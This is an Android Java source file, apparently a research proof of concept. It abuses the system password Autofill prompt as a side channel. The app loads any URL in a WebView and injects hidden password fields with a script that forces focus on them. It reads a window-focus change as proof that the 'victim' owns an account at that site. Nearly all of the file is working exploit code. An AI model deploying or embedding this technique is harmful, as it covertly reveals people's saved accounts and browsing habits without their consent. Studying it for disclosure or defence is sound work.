package com.research.autofillhistory;

import androidx.appcompat.app.AppCompatActivity;

import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {

    String htmlData = "" +
            "<form action=\"\" autocomplete=\"none\" onsubmit=\"\">\n" +
            " <input type=\"password\" inputmode=\"none\" id=\"pwd\" name=\"pwd\" value=\"\" autocomplete=\"off\" placeholder=\"Password\" />" +
            " <input type=\"password\" inputmode=\"none\" id=\"pwd1\" name=\"pwd1\" value=\"\" autocomplete=\"off\" placeholder=\"Password\" />" +
            "</form>\n" +
            "" +
            "<script>" +
            "var timer;\n" +
            "\t\tvar count = 0;\n" +
            "\t\tvar counter = 0;\n" +
            "\t\tvar pwd = document.getElementById(\"pwd1\");\n" +
            "\t\t\n" +
            "\t\tvar pwd1 = document.getElementById(\"pwd\");\n" +
            "        \n" +
            "            timer = setInterval(function() {\t\t\t\n" +
            "\t\t\tif(count == 1){\n" +
            "\t\t\tpwd.focus();\n" +
            "\t\t\tpwd.click();\n" +
            "\t\t\tcount = 0;\n" +
            "\t\t\tcounter++;\n" +
            "if(counter>1){clearInterval(timer);}" +//stop timer
            "\t\t\t}else{\n" +
            "\t\t\tcount = 1;\n" +
            "\t\t\tpwd1.focus();\n" +
            "\t\t\tpwd1.click();\n" +
            "\t\t\t}\n" +
            "                \n" +
            "            }, 1);\n" +//repeat after 1ms
            "\n\n" +
            "</script>" +
            "";
    String myUrl = "https://google.com", confirmedUrl = "";
    WebView webView;
    TextView textView;
    EditText textUrl;
    Button checkBtn;
    int firstLoad =1;
    boolean ignoreFocus = false;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webView);
        webView.getSettings().setJavaScriptEnabled(true);

        webView.clearCache(true);
        webView.clearCache(true); 

        textView = findViewById(R.id.textView);
        textUrl = findViewById(R.id.textUrl);


        webView.setWebViewClient(new WebViewClient() {

            public void onPageFinished(WebView view, String url) {

                if(firstLoad == 1) {//only load HTML after first complete load to avoid a loop
                    firstLoad++;

                    webView.requestFocus();
                    webView.loadUrl(
                            "javascript:(function() {"
                                    + "document.open();\n" +
                                    "   document.write('" + htmlData + "');\n" +
                                    "   document.close();"
                                    + "})()"
                    );

                    //if Autofill UI will show, this will change, otherwise user might not have visited
                    textView.setText("No Password Autofill UI, hence you might not own an account at " + myUrl + "");
                    checkBtn.setEnabled(true);
                }

            }

        });


    }
    public void checkHistory(View view){
        checkBtn = (Button) view;
        myUrl = String.valueOf(textUrl.getText());
        firstLoad = 1;
        textView.setTextColor(Color.BLUE);
        textView.setText("Enter Url Below To Check If Victim Owns An Account On That Website");
        checkBtn.setEnabled(false);
        confirmedUrl = "";
        webView.clearCache(true);
        webView.clearCache(true);
        webView.loadUrl(myUrl);
    }

    @Override
    public void onPause(){
        super.onPause();
        ignoreFocus = true;
    }

    @Override
    public void onResume(){
        super.onResume();
        ignoreFocus = false;
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        boolean isAndroid10Plus = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q);
        if(!isAndroid10Plus && ignoreFocus) return;

        if(!hasFocus) {
            textView.setText("Password Autofill UI confirms that you own an account at "+myUrl+", thus confirming that you visit this website more often than not.");
            textView.setTextColor(Color.RED);
            confirmedUrl = myUrl;
        }else {
            textView.setTextColor(Color.BLUE);
            if(firstLoad!=1 && confirmedUrl!=myUrl) {
                textView.setText("No Password Autofill UI, hence you might not own an account at " + myUrl + "");
            }else{
                textView.setText("Enter Url Below To Check If Victim Owns An Account On That Website");
            }
        }

        super.onWindowFocusChanged(hasFocus);
    }
}